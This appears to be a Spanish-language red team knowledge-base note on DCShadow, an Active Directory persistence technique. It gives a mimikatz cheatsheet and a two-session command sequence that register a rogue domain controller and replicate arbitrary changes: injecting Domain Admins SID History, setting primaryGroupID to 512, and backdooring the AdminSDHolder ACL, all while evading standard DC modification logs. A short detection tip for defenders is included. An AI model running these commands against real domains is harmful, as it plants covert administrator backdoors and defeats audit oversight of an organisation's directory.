---
aliases:
  - DCShadow
  - DC Shadow Attack
tags:
  - technique/persistence
  - technique/defense-evasion
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[DCSync]]"
  - "[[AdminSDHolder Abuse]]"
  - "[[Mimikatz Cheatsheet]]"
---
# DCShadow

Técnica de **persistencia stealth** (mimikatz, Delpy/Le Toux). En vez de modificar AD por los canales normales (que loguean), el atacante **registra temporalmente un DC falso** y usa la **replicación** (DRSUAPI) para inyectar cambios arbitrarios en el dominio. Como el cambio entra "por replicación de un DC", **no aparece en los logs de modificación del DC legítimo** (evade 4662/4670/4738).

Requiere privilegios de **Domain Admin / DA-equivalente** (o derechos de replicación + crear objetos en el sitio de Configuration). No es escalada — es persistencia/encubrimiento post-DA.

---

## Cheatsheet

| **Comando (mimikatz)** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `lsadump::dcshadow /object:TARGET /attribute:ATTR /value:VAL` | Setea el cambio a pushear (consola "push") | Definir la modificación. |
| `lsadump::dcshadow /push` | (segunda sesión SYSTEM) Registra el DC rogue y replica el cambio | Ejecutar el push. |
| `/object:user1 /attribute:sidHistory /value:S-1-5-21-...-512` | Inyectar **SID History** de Domain Admins → privesc encubierta | Backdoor de privilegios. |
| `/object:user1 /attribute:primaryGroupID /value:512` | Hacer al user miembro de Domain Admins sin tocar el grupo | Membership stealth. |
| `/object:CN=AdminSDHolder... /attribute:ntSecurityDescriptor /value:...` | Backdoor de ACL propagado por SDProp → [[AdminSDHolder Abuse]] | Persistencia Tier 0. |

```text
:: Requiere DOS sesiones de mimikatz, ambas como SYSTEM (PsExec -s) ::

# Sesión 1 (la que registra el DC y hace push) — necesita SeDebug + SYSTEM
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:jdoe /attribute:sidHistory /value:S-1-5-21-1004336348-1177238915-682003330-512

# Sesión 2 (dispara la replicación) — como Domain Admin
mimikatz # lsadump::dcshadow /push
```

---

## Overview

DCShadow abusa de que un DC confía en otros DCs para replicar cambios. Mimikatz crea temporalmente los objetos en `CN=Configuration` que hacen ver al host del atacante como un DC, fuerza una replicación (`DrsReplicaAdd`), inyecta los cambios y **borra los objetos del DC rogue** — dejando el cambio aplicado pero sin rastro de "quién" lo hizo en los logs estándar.

**Casos de uso:** inyectar SID History (privesc invisible), backdoor de ACL en AdminSDHolder, modificar `ntSecurityDescriptor`, resetear contadores. Es persistencia de **Tier 0** difícil de detectar sin monitoreo de replicación.

> [!warning] Requiere DA
> No es un vector de escalada — necesitás ya ser DA (o tener `DS-Install-Replica` + write en el sitio). Su valor es **encubrimiento y persistencia**, no acceso inicial.

> [!tip] Detección (Blue)
> Monitorear creación de objetos `nTDSDSA` fuera de promoción de DC legítima, replicaciones desde IPs no-DC, y eventos 4928/4929 (replicación). Microsoft ATA/MDI detectan DCShadow.

---

## Recursos

- [DCShadow — dcshadow.com (Delpy/Le Toux)](https://www.dcshadow.com/) — explicación original.
- [The Hacker Recipes — DCShadow](https://www.thehacker.recipes/ad/persistence/dcshadow) — comandos y variantes.
